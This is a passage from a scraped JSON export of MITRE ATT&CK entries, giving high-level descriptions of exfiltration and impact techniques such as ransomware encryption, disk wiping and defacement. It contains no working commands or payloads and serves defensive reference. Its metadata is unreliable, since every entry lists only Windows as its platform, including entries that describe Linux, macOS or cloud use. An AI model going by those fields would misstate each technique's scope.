    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Web Service",
    "parent_technique_id": "T1102",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:55.706287"
  },
  {
    "technique_id": "T1020",
    "name": "Automated Exfiltration",
    "description": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.[1]When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such asExfiltration Over C2 ChannelandExfiltration Over Alternative Protocol.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:59.078409",
    "subtechniques": []
  },
  {
    "technique_id": "T1030",
    "name": "Data Transfer Size Limits",
    "description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:02.353857",
    "subtechniques": []
  },
  {
    "technique_id": "T1048",
    "name": "Exfiltration Over Alternative Protocol",
    "description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels.Exfiltration Over Alternative Protocolcan be done using various common operating system utilities such asNet/SMB or FTP.[1]On macOS and Linuxcurlmay be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.[2]Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console orCloud API.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:05.715903",
    "subtechniques": [
      {
        "id": "T1048.001",
        "name": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
      },
      {
        "id": "T1048.002",
        "name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
      },
      {
        "id": "T1048.003",
        "name": "Exfiltration Over Unencrypted Non-C2 Protocol"
      }
    ]
  },
  {
    "technique_id": "T1048.001",
    "name": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
    "description": "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data.Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Exfiltration Over Alternative Protocol",
    "parent_technique_id": "T1048",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:09.098678"
  },
  {
    "technique_id": "T1048.002",
    "name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
    "description": "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin.Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Exfiltration Over Alternative Protocol",
    "parent_technique_id": "T1048",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:12.458172"
  },
  {
    "technique_id": "T1048.003",
    "name": "Exfiltration Over Unencrypted Non-C2 Protocol",
    "description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.[1]Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Exfiltration Over Alternative Protocol",
    "parent_technique_id": "T1048",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:15.844176"
  },
  {
    "technique_id": "T1041",
    "name": "Exfiltration Over C2 Channel",
    "description": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:19.326033",
    "subtechniques": []
  },
  {
    "technique_id": "T1011",
    "name": "Exfiltration Over Other Network Medium",
    "description": "Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:22.665486",
    "subtechniques": [
      {
        "id": "T1011.001",
        "name": "Exfiltration Over Bluetooth"
      }
    ]
  },
  {
    "technique_id": "T1011.001",
    "name": "Exfiltration Over Bluetooth",
    "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Exfiltration Over Other Network Medium",
    "parent_technique_id": "T1011",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:26.020556"
  },
  {
    "technique_id": "T1052",
    "name": "Exfiltration Over Physical Medium",
    "description": "Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:29.375471",
    "subtechniques": [
      {
        "id": "T1052.001",
        "name": "Exfiltration over USB"
      }
    ]
  },
  {
    "technique_id": "T1052.001",
    "name": "Exfiltration over USB",
    "description": "Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Exfiltration Over Physical Medium",
    "parent_technique_id": "T1052",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:32.732579"
  },
  {
    "technique_id": "T1567",
    "name": "Exfiltration Over Web Service",
    "description": "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:36.092587",
    "subtechniques": [
      {
        "id": "T1567.001",
        "name": "Exfiltration to Code Repository"
      },
      {
        "id": "T1567.002",
        "name": "Exfiltration to Cloud Storage"
      },
      {
        "id": "T1567.003",
        "name": "Exfiltration to Text Storage Sites"
      },
      {
        "id": "T1567.004",
        "name": "Exfiltration Over Webhook"
      }
    ]
  },
  {
    "technique_id": "T1567.001",
    "name": "Exfiltration to Code Repository",
    "description": "Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Exfiltration Over Web Service",
    "parent_technique_id": "T1567",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:39.444793"
  },
  {
    "technique_id": "T1567.002",
    "name": "Exfiltration to Cloud Storage",
    "description": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Exfiltration Over Web Service",
    "parent_technique_id": "T1567",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:42.842093"
  },
  {
    "technique_id": "T1567.003",
    "name": "Exfiltration to Text Storage Sites",
    "description": "Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such aspastebin[.]com, are commonly used by developers to share code and other information.Text storage sites are often used to host malicious code for C2 communication (e.g.,Stage Capabilities), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.[1]Note:This is distinct fromExfiltration to Code Repository, which highlight access to code repositories via APIs.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Exfiltration Over Web Service",
    "parent_technique_id": "T1567",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:46.200626"
  },
  {
    "technique_id": "T1567.004",
    "name": "Exfiltration Over Webhook",
    "description": "Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server.[1]Many public and commercial services, such as Discord, Slack, andwebhook.site, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello.[2]When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application.Adversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeatedAutomated Exfiltrationof emails, chat messages, and other data.[3]Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.[4]Access to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.[5][6][7]",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Exfiltration Over Web Service",
    "parent_technique_id": "T1567",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:49.567148"
  },
  {
    "technique_id": "T1029",
    "name": "Scheduled Transfer",
    "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such asExfiltration Over C2 ChannelorExfiltration Over Alternative Protocol.",
    "tactic": "Exfiltration",
    "tactics": [
      "Exfiltration"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:52.929126",
    "subtechniques": []
  },
  {
    "technique_id": "T1531",
    "name": "Account Access Removal",
    "description": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform aSystem Shutdown/Rebootto set malicious changes into place.[1][2]In Windows,Netutility,Set-LocalUserandSet-ADAccountPasswordPowerShellcmdlets may be used by adversaries to modify user accounts. Accounts could also be disabled by Group Policy. In Linux, thepasswdutility may be used to change passwords. On ESXi servers, accounts can be removed or modified via esxcli (system account set,system account remove).Adversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such asData DestructionandDefacement, in order to impede incident response/recovery before completing theData Encrypted for Impactobjective.",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:56.295138",
    "subtechniques": []
  },
  {
    "technique_id": "T1485",
    "name": "Data Destruction",
    "description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.[1][2][3][4][5][6]Common operating system file deletion commands such asdelandrmoften only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct fromDisk Content WipeandDisk Structure Wipebecause individual files are destroyed rather than sections of a storage disk or the disk's logical structure.Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.[4][5]In some cases politically oriented image files have been used to overwrite data.[2][3][4]To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques likeValid Accounts,OS Credential Dumping, andSMB/Windows Admin Shares.[1][2][3][4][6].In cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers.[7][8]Similarly, they may delete virtual machines from on-prem virtualized environments.",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:25:59.685574",
    "subtechniques": []
  },
  {
    "technique_id": "T1486",
    "name": "Data Encrypted for Impact",
    "description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.[1][2][3][4]In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such asFile and Directory Permissions ModificationorSystem Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files.[5]In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.[3]Adversaries may also encrypt virtual machines hosted on ESXi or other hypervisors.[6]To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques likeValid Accounts,OS Credential Dumping, andSMB/Windows Admin Shares.[2][3]Encryption malware may also leverageInternal Defacement, such as changing victim wallpapers or ESXi server login messages, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").[7][8]In cloud environments, storage objects within compromised accounts may also be encrypted.[9]For example, in AWS environments, adversaries may leverage services such as AWSâ€™s Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt data.[10]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:03.176203",
    "subtechniques": []
  },
  {
    "technique_id": "T1565",
    "name": "Data Manipulation",
    "description": "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.[1]By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:06.532649",
    "subtechniques": [
      {
        "id": "T1565.001",
        "name": "Stored Data Manipulation"
      },
      {
        "id": "T1565.002",
        "name": "Transmitted Data Manipulation"
      },
      {
        "id": "T1565.003",
        "name": "Runtime Data Manipulation"
      }
    ]
  },
  {
    "technique_id": "T1565.001",
    "name": "Stored Data Manipulation",
    "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.[1][2]By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Data Manipulation",
    "parent_technique_id": "T1565",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:09.924945"
  },
  {
    "technique_id": "T1565.002",
    "name": "Transmitted Data Manipulation",
    "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.[1][2]By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Data Manipulation",
    "parent_technique_id": "T1565",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:13.282557"
  },
  {
    "technique_id": "T1565.003",
    "name": "Runtime Data Manipulation",
    "description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.[1][2]By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conductChange Default File AssociationandMasqueradingto cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Data Manipulation",
    "parent_technique_id": "T1565",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:16.617917"
  },
  {
    "technique_id": "T1491",
    "name": "Defacement",
    "description": "Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons forDefacementinclude delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part ofDefacementin order to cause user discomfort, or to pressure compliance with accompanying messages.",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:19.991122",
    "subtechniques": [
      {
        "id": "T1491.001",
        "name": "Internal Defacement"
      },
      {
        "id": "T1491.002",
        "name": "External Defacement"
      }
    ]
  },
  {
    "technique_id": "T1491.001",
    "name": "Internal Defacement",
    "description": "An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites or server login messages, or directly to user systems with the replacement of the desktop wallpaper.[1][2]Disturbing or offensive images may be used as a part ofInternal Defacementin order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.[3]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Defacement",
    "parent_technique_id": "T1491",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:23.332571"
  },
  {
    "technique_id": "T1491.002",
    "name": "External Defacement",
    "description": "An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users.External Defacementmay ultimately cause users to distrust the systems and to question/discredit the systemâ€™s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.[1][2][3]External Defacementmay be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such asDrive-by Compromise.[4]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Defacement",
    "parent_technique_id": "T1491",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:26.696256"
  },
  {
    "technique_id": "T1561",
    "name": "Disk Wipe",
    "description": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques likeValid Accounts,OS Credential Dumping, andSMB/Windows Admin Shares.[1]On network devices, adversaries may wipe configuration files and other data from the device usingNetwork Device CLIcommands such aserase.[2]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:30.051357",
    "subtechniques": [
      {
        "id": "T1561.001",
        "name": "Disk Content Wipe"
      },
      {
        "id": "T1561.002",
        "name": "Disk Structure Wipe"
      }
    ]
  },
  {
    "technique_id": "T1561.001",
    "name": "Disk Content Wipe",
    "description": "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.[1][2][3]Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.[2]Adversaries have also been observed leveraging third-party drivers likeRawDiskto directly access disk content.[1][2]This behavior is distinct fromData Destructionbecause sections of the disk are erased instead of individual files.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques likeValid Accounts,OS Credential Dumping, andSMB/Windows Admin Shares.[2]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Disk Wipe",
    "parent_technique_id": "T1561",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:33.404424"
  },
  {
    "technique_id": "T1561.002",
    "name": "Disk Structure Wipe",
    "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources.Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.[1][2][3][4][5]The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable.Disk Structure Wipemay be performed in isolation, or along withDisk Content Wipeif all sectors of a disk are wiped.On a network devices, adversaries may reformat the file system usingNetwork Device CLIcommands such asformat.[6]To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques likeValid Accounts,OS Credential Dumping, andSMB/Windows Admin Shares.[1][2][3][4]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Disk Wipe",
    "parent_technique_id": "T1561",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:36.776084"
  },
  {
    "technique_id": "T1667",
    "name": "Email Bombing",
    "description": "Adversaries may flood targeted email addresses with an overwhelming volume of messages. This may bury legitimate emails in a flood of spam and disrupt business operations.[1][2]An adversary may accomplish email bombing by leveraging an automated bot to register a targeted address for e-mail lists that do not validate new signups, such as online newsletters. The result can be a wave of thousands of e-mails that effectively overloads the victimâ€™s inbox.[2][3]By sending hundreds or thousands of e-mails in quick succession, adversaries may successfully divert attention away from and bury legitimate messages including security alerts, daily business processes like help desk tickets and client correspondence, or ongoing scams.[3]This behavior can also be used as a tool of harassment.[2]This behavior may be a precursor forSpearphishing Voice. For example, an adversary may email bomb a target and then follow up with a phone call to fraudulently offer assistance. This social engineering may lead to the use ofRemote Access Softwareto steal credentials, deploy ransomware, conductFinancial Theft[1], or engage in other malicious activity.[4]",
    "tactic": "Impact",
    "tactics": [
      "Impact"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:26:40.125578",
    "subtechniques": []
  },
  {
    "technique_id": "T1499",
    "name": "Endpoint Denial of Service",
